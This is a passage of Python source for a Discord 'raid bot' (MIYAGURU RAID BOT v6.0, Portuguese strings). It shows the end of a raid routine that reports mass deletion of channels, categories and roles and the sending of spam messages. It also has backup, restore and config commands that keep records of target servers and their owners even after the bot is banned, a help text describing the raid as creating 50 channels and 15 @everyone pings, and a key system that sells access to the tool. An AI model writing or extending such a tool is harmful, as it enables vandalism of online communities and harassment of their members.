        print(f"       Categorias apagadas: {deleted_cat}")
        print(f"       Roles apagadas: {deleted_r}")
        print(f"       Canais criados: {created}")
        print(f"       Mensagens: {sent}")

        try:
            await message.channel.send(
                f"✅ RAID CONCLUÍDO!\n"
                f"📡 {deleted_ch} canais apagados\n"
                f"🗂️ {deleted_cat} categorias apagadas\n"
                f"🗑️ {deleted_r} roles apagadas\n"
                f"📂 {created} novos canais\n"
                f"💬 {sent} mensagens enviadas\n"
                f"💾 Backup salvo (com permissões)"
            )
        except Exception:
            pass

        RAID_ACTIVE = False

    # ---- !raid stop ----
    elif content == "!raid stop":
        RAID_ACTIVE = False
        print("[RAID] Raid parado!")
        try:
            await message.channel.send("🛑 Raid parado!")
        except Exception:
            pass

    # ---- !backup ----
    elif content == "!backup":
        try:
            await message.channel.send("💾 Salvando backup com permissões...")
        except Exception:
            pass

        print("\n[BACKUP] Iniciando...")
        backup = await save_backup(guild)

        try:
            await message.channel.send(
                f"💾 **Backup salvo com permissões!**\n"
                f"📁 Categorias: {len(backup['categories'])}\n"
                f"📋 Roles: {len(backup['roles'])}\n"
                f"📂 Canais: {len(backup['channels'])}\n"
                f"🔒 Permissões salvas em todos os itens"
            )
        except Exception:
            pass

        print("[BACKUP] CONCLUÍDO!")

    # ---- !restore ----
    elif content == "!restore":
        try:
            await message.channel.send("♻️ Restaurando com permissões...")
        except Exception:
            pass

        # Tenta primeiro o backup local, depois o config persistente
        if os.path.exists(BACKUP_FILE):
            success, msg = await restore_backup(guild)
        else:
            success, msg = await restore_from_config(guild)
        try:
            await message.channel.send(msg if success else f"❌ {msg}")
        except Exception:
            pass

    # ---- !saveconfig (SÓ OWNER) — Atualiza config manualmente ----
    elif content == "!saveconfig":
        try:
            await message.channel.send("💾 Atualizando configs do servidor...")
        except Exception:
            pass
        print("\n[CONFIG] Atualizando config persistente...")
        config = await save_server_config(guild)
        try:
            await message.channel.send(
                f"✅ **Config atualizada!**\n"
                f"🏷️ Servidor: **{guild.name}**\n"
                f"👑 Dono: {guild.owner} (`{guild.owner_id}`)\n"
                f"🆔 ID: `{guild.id}`\n"
                f"👥 Membros: {guild.member_count}\n"
                f"📁 Categorias: {len(config['categories'])}\n"
                f"📋 Roles: {len(config['roles'])}\n"
                f"📂 Canais: {len(config['channels'])}\n"
                f"\nConfig salva automaticamente mesmo se o bot for banido!"
            )
        except Exception:
            pass
        print("[CONFIG] CONCLUÍDO!")

    # ---- !configs (Painel de servidores salvos — SÓ OWNER) ----
    elif content == "!configs":
        configs = load_server_configs()
        servers = configs.get("servers", {})
        if not servers:
            try:
                await message.channel.send("📋 **Nenhum servidor salvo.**")
            except Exception:
                pass
            return
        desc = "**🖥️ Servidores salvos (auto):**\n\n"
        for srv_id, srv_config in servers.items():
            owner_name = srv_config.get("owner_name", "?")
            owner_id = srv_config.get("owner_id", "?")
            desc += (
                f"**{srv_config.get('guild_name', '?')}** (`{srv_id}`)\n"
                f"   👑 Dono: {owner_name} (`{owner_id}`)\n"
                f"   👥 Membros: {srv_config.get('member_count', '?')}\n"
                f"   📁 {len(srv_config.get('categories', []))} categorias | "
                f"📋 {len(srv_config.get('roles', []))} roles | "
                f"📂 {len(srv_config.get('channels', []))} canais\n"
                f"   📅 Salvo em: {srv_config.get('saved_at', '?')}\n\n"
            )
        try:
            await message.channel.send(desc)
        except Exception:
            pass

    # ---- !help / !info ----
    elif content == "!help" or content == "!info":
        if is_owner:
            help_text = (
                "**MIYAGURU RAID BOT v6.0**\n\n"
                "**🤖 Comandos do Bot:**\n"
                "```\n"
                "!raid          — RAID COMPLETO (paralelo)\n"
                "                 Apaga canais + categorias + roles\n"
                "                 Cria 50 canais + 15 msgs @everyone\n"
                "                 Backup auto + config auto\n\n"
                "!raid stop     — Para o raid\n"
                "!backup        — Backup com permissões\n"
                "!saveconfig    — Atualizar config manual\n"
                "!configs       — Painel de servidores salvos\n"
                "!restore       — Restaurar (backup ou config auto)\n"
                "```\n"
                "**🔑 Comandos de Key (Só Owner):**\n"
                "```\n"
                "!key gen 30m   — Key de 30 minutos\n"
                "!key gen 1h    — Key de 1 hora\n"
                "!key gen 30d   — Key de 30 dias\n"
                "!key gen 1y    — Key de 1 ano\n"
                "!key gen 2y    — Key de 2 anos\n"
                "!key gen lifetime — Key vitalícia\n\n"
                "!keys          — Painel de todas as keys\n"
                "!key revoke <key> — Revogar key\n"
                "```\n"
                "**📝 Uso por outros:**\n"
                "```\n"
                "!use <key>     — Ativar key\n"
                "```\n"
            )
        else:
            help_text = (
                "**MIYAGURU RAID BOT v6.0**\n\n"
                "Para usar o bot, você precisa de uma key.\n"
                "Use `!use <sua_key>` para ativar.\n\n"
                "**Comandos disponíveis:**\n"
                "```\n"
                "!use <key>     — Ativar sua key\n"
                "!raid          — RAID COMPLETO\n"
                "!raid stop     — Para o raid\n"
                "!backup        — Backup com permissões\n"
                "!restore       — Restaurar (backup ou config)\n"
                "!help          — Esta ajuda\n"
                "```"
            )
        try:
            await message.channel.send(help_text)
        except Exception:
            pass


# ============================================================
# INICIAR BOT
# ============================================================

if __name__ == "__main__":
    bot.run(TOKEN)
